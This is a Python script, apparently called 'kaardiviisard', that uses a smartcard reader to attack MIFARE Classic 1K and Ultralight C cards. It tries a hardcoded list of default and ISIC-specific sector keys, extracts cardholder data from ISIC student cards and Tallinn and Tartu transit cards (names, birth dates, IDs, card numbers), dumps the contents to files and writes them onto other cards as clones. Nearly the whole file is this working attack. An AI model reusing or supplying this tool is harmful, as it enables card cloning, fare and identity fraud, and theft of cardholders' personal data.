#!/usr/bin/env python3

from smartcard.CardType import AnyCardType
from smartcard.CardRequest import CardRequest
from smartcard.util import toHexString, toBytes, toASCIIString
import sys

Classic1K_ATR = "3B 8F 80 01 80 4F 0C A0 00 00 03 06 03 00 01 00 00 00 00 6A"
UltralightC_ATR = "3B 8F 80 01 80 4F 0C A0 00 00 03 06 03 00 3A 00 00 00 00 51"

cardtype = AnyCardType()
cardrequest = CardRequest(timeout=60, cardType=cardtype)

cardservice = cardrequest.waitforcard()

cardservice.connection.connect()

# get ATR of current card
current_card_ATR = cardservice.connection.getATR()


def send(apdu):
    data, sw1, sw2 = cardservice.connection.transmit(apdu)

    # success
    if [sw1, sw2] == [0x90, 0x00]:
        return data
    else:
        return "Error"


def prettyHex(data):
    for i in range(len(data)):
        if data[i] < 33 or data[i] > 126:
            data[i] = 46

    return toASCIIString(data)


'''
common default A key values
NDEF Keys: A0A1A2A3A4A5, D3F7D3F7D3F7
Factory Keys: FFFFFFFFFFFF
ISIC Keys: 8c5116ae70b6, 57da46f810ea, e9b0328046cb, 
           687a02ece08c, d55d401f9df7, 4c5b7fef08f2, 
           7ce08602c84c, d9e57607cb4f, dcfecb8f7fda
'''
defaultkeys = {
    0: "ff ff ff ff ff ff",
    1: "d3 f7 d3 f7 d3 f7",
    2: "a0 a1 a2 a3 a4 a5",
    3: "00 00 00 00 00 00",
    4: "b0 b1 b2 b3 b4 b5",
    5: "4d 3a 99 c3 51 dd",
    6: "1a 98 2c 7e 45 9a",
    7: "aa bb cc dd ee ff",
    8: "71 4c 5c 88 6e 97",
    9: "58 7e e5 f9 35 0f",
    10: "a0 47 8c c3 90 91",
    11: "53 3c b6 c7 23 f6",
    12: "8f d0 a4 f2 56 e9",
    13: "a0 b0 c0 d0 e0 f0",
    14: "a1 b1 c1 d1 e1 f1",
    15: "68 7a 02 ec e0 8c",
    16: "e9 b0 32 80 46 cb",
    17: "57 da 46 f8 10 ea",
    18: "8c 51 16 ae 70 b6",
    19: "d5 5d 40 1f 9d f7",
    20: "4c 5b 7f ef 08 f2",
    21: "7c e0 86 02 c8 4c",
    22: "d9 e5 76 07 cb 4f",
    23: "dc fe cb 8f 7f da"
}


def getBlockInfo(block_nr):
    searchforisic = True
    loc = 0
    # load athentication key in memory
    while searchforisic and loc < len(defaultkeys):
        # print(isickeys[loc])
        send([0xFF, 0x82, 0x00, 0x00, 0x06] + toBytes(
            defaultkeys[loc]))  # This was the working Key for my ISIC card, Make it work on all

        # authenticate to the block
        data = send([0xFF, 0x86, 0x00, 0x00, 0x05, 0x01, 0x00, block_nr, 0x60, 0x00])
        # print(data)
        if (data != "Error"):
            searchforisic = False
        else:
            loc += 1

    send([0xFF, 0x86, 0x00, 0x00, 0x05, 0x01, 0x00, block_nr, 0x60, 0x00])

    # get block information
    block_reading = send([0xFF, 0xB0, 0x00, block_nr, 0x10])

    return toASCIIString(block_reading)


def getPage(number):
    return toASCIIString(send([0xFF, 0xB0, 0x00, number, 0x10]))


def readUltralightC():
    for i in range(4, 40, 4):
        # read every user data page
        data = send([0xFF, 0xB0, 0x00, i, 0x10])
        print(f"Page {i:02d}: {toHexString(data)}\t |{prettyHex(data)}|")


def dumpUltralightC(filename):
    datastring = ""
    for i in range(4, 40, 4):
        data = send([0xFF, 0xB0, 0x00, i, 0x10])
        datastring += f'{toHexString(data)}\n'
    file = open(f'{filename}.txt', 'w')
    file.write(datastring[:-1])
    print(f'{filename}.txt has been created with the dump of the card')
    file.close()

def cloneUltralightC(filename):
    file = open(f'{filename}.txt', 'r')
    data = file.read().split('\n')
    file.close()
    print(data)
    counter = 0
    for i in range(4, 40, 4):
        send([0xFF, 0xD6, 0x00, i, 16] + toBytes(data[counter]))
        counter += 1
    print("Partial clone created")
    print("Use an ACR122U with libnfc to set the correct UID on the card for a full clone")
    print("Exiting")


keysused = {}


def readClassic1k():
    for i in range(0, 64):
        if i % 4 == 0:
            keyloc = 0
            search_for_key = True

            # Try all keys or until one is found
            while search_for_key and keyloc < len(defaultkeys):
                # load authentication keys in 0x00
                send([0xFF, 0x82, 0x00, 0x00, 0x06] + toBytes(defaultkeys[keyloc]))

                # Enable if reader is not able to switch keys quickly ie for ACR122
                # time.sleep(2)

                # authenticate sector 0 to 15
                data = send([0xFF, 0x86, 0x00, 0x00, 0x05, 0x01, 0x00, i, 0x60, 0x00])
                if data != "Error":
                    keysused["sector " + str(int(i / 4)) + " key"] = defaultkeys[keyloc]
                    search_for_key = False
                else:
                    keyloc += 1

            print(f"------------------------Sector {int(i / 4)}-------------------------")

        # if key found read block
        if keyloc != len(defaultkeys):
            data = send([0xFF, 0xB0, 0x00, i, 0x10])
            print(f"Block {i:02d}: {toHexString(data)}\t |{prettyHex(data)}|")
        else:
            print(f"Block {i:02d}: {'Unable to read'}\t |{'................'}|")


def dumpclassic(filename):
    file = open(f'{filename}.txt', "w")
    datastring = ""
    for i in range(0, 64):
        if i % 4 == 0:
            keyloc = 0
            search_for_key = True

            # Try all keys or until one is found
            while search_for_key and keyloc < len(defaultkeys):
                # load authentication keys in 0x00
                send([0xFF, 0x82, 0x00, 0x00, 0x06] + toBytes(defaultkeys[keyloc]))
                # authenticate sector 0 to 15
                data = send([0xFF, 0x86, 0x00, 0x00, 0x05, 0x01, 0x00, i, 0x60, 0x00])
                if data != "Error":
                    search_for_key = False
                else:
                    keyloc += 1
        if keyloc != len(defaultkeys):
            data = send([0xFF, 0xB0, 0x00, i, 0x10])
            datastring += f'{toHexString(data)}\n'
    # Removes the last new line
    file.write(datastring[:-1])
    print(f'{filename}.txt has been created with the dump of the card')
    file.close()


def authenticateclassic(block_nr):
    # Try key A
    auth = send([0xFF, 0x86, 0x00, 0x00, 0x05, 0x01, 0x00, block_nr, 0x61, 0x00])

    # Try key B
    if auth == 'Error':
        auth = send([0xFF, 0x86, 0x00, 0x00, 0x05, 0x01, 0x00, block_nr, 0x61, 0x00])

    if auth == 'Error':
        print(f'Error authenticating block: {block_nr}')
        return False
    else:
        return True


def cloneclassic(filename):
    file = open(f'{filename}.txt', "r")
    data = file.read().split("\n")
    file.close()
    print(data)
    # Assumes that A and B keys are FF FF FF FF FF FF
    # load key in memory
    send([0xFF, 0x82, 0x00, 0x00, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF])

    for i in range(4, len(data)):
        if i % 4 == 0:
            # Authenticates block
            authenticateclassic(i)
        # Writes to block
        send([0xFF, 0xD6, 0x00, i, 16] + toBytes(data[i]))

    print("Partial clone has been created")
    print("Use an ACR122U with libnfc to set the correct UID (Only 4-byte UID is currently supported)")
    print("Exiting")


def getDataFields(ATR):
    if ATR == Classic1K_ATR:
        # 9 if Tallinn Transportation Card, 8 if ISIC card
        # Currently hardcoded values for name and school
        if int(getBlockInfo(8)[-1]) == 8:
            isicCardPAN = getBlockInfo(8)[7:] + getBlockInfo(9)[:11]
            isicCardNumber = getBlockInfo(8)[-1] + getBlockInfo(9)[:10]
            isicCardRecord = getBlockInfo(4)[7:] + getBlockInfo(5)[:8]
            isicCardCert = getBlockInfo(22)[3:] + getBlockInfo(24) + getBlockInfo(25)[:8]
            isicNumber = getBlockInfo(28)[:-2]
            isicUser = getBlockInfo(32).split('.')[0] + " " + getBlockInfo(33).split('.')[0] + " " + \
                       getBlockInfo(34).split('.')[0]
            isicID = getBlockInfo(36)[:11]
            isicSchool = getBlockInfo(37)[:13]
            isicExpiration = getBlockInfo(40)[:10]

            print("\n************ CARD INFO **************\n")
            print("Card type: ISIC CARD")
            print("External type record: " + isicCardRecord)
            print("Card ATR: " + toHexString(current_card_ATR))
            print("Card UID: " + toHexString(send([0xFF, 0xCA, 0x00, 0x00, 0x00])))
            print("Card Number: " + isicCardNumber)
            print("Card PAN: " + isicCardPAN[:-1])
            print("Cert: " + isicCardCert)
            print("ISIC number: " + isicNumber)
            print("User and DoB: " + isicUser)
            print("User ID: " + isicID)
            print("School: " + isicSchool)
            print("Expiration date: " + isicExpiration)
            print("Keys used for authentication: ")
            print()
            for value in keysused:
                print(value + ": " + keysused[value])

        elif int(getBlockInfo(8)[15]) == 9:
            tallinnCardPAN = getBlockInfo(8)[7:] + getBlockInfo(9)[:11]
            tallinnCardNumber = getBlockInfo(8)[-1] + getBlockInfo(9)[:10]
            tallinnCardRecord = getBlockInfo(4)[7:] + getBlockInfo(5)[:8]
            tallinnCardCert = getBlockInfo(22) + getBlockInfo(24) + getBlockInfo(25)[:5]

            print("\n************ CARD INFO **************\n")
            print("Card type: Tallinn Public Transportation Card")
            print("External type record: " + tallinnCardRecord)
            print("Card ATR: " + toHexString(current_card_ATR))
            print("Card UID: " + toHexString(send([0xFF, 0xCA, 0x00, 0x00, 0x00])))
            print("Card Number: " + tallinnCardNumber)
            print("Card PAN: " + tallinnCardPAN[:-1])
            print("Cert: " + tallinnCardCert)
            print()
            for value in keysused:
                print(value + ": " + keysused[value])
        else:
            print("Card type unknown")
    elif ATR == UltralightC_ATR:
        tartuCardPAN = getPage(12)[11:] + getPage(16)[:-1]
        tartuCardType = getPage(4)[5:] + getPage(8)[:6]

        print("\n************ CARD INFO **************\n")
        print("Card type: Tartu bus card")
        print("External type record: " + tartuCardType)
        print("Card ATR: " + ATR)
        print("Card UID: " + toHexString(send([0xFF, 0xCA, 0x00, 0x00, 0x00])))
        print("PAN: " + tartuCardPAN[:-1])
        print("Card Number: " + tartuCardPAN[8:-1])


def main():

    if len(sys.argv) == 2 and sys.argv[1] == '-read':
        if toHexString(current_card_ATR) == Classic1K_ATR:
            readClassic1k()
            getDataFields(toHexString(current_card_ATR))
        elif toHexString(current_card_ATR) == UltralightC_ATR:
            readUltralightC()
            getDataFields(toHexString(current_card_ATR))
        else:
            print("[!] Card type not supported")

    elif len(sys.argv) == 3 and sys.argv[1] == '-dump':
        if toHexString(current_card_ATR) == Classic1K_ATR:
            dumpclassic(sys.argv[2])
        elif toHexString(current_card_ATR) == UltralightC_ATR:
            dumpUltralightC(sys.argv[2])
        else:
            print("[!] Card type not supported")

    elif len(sys.argv) == 3 and sys.argv[1] == '-clone':
        if toHexString(current_card_ATR) == Classic1K_ATR:
            cloneclassic(sys.argv[2])
        elif toHexString(current_card_ATR) == UltralightC_ATR:
            cloneUltralightC(sys.argv[2])
        else:
            print("[!] Card type not supported")

    else:
        print("Please use a correct format, Examples:")
        print()
        print("Extract contents: python3 kaardiviisard.py -read")
        print("Dump card data to file: python3 kaardiviisard.py -dump <filename>")
        print("Write data dump onto card: python3 kaardiviisard.py -clone <filename>")


if __name__ == '__main__':
    main()
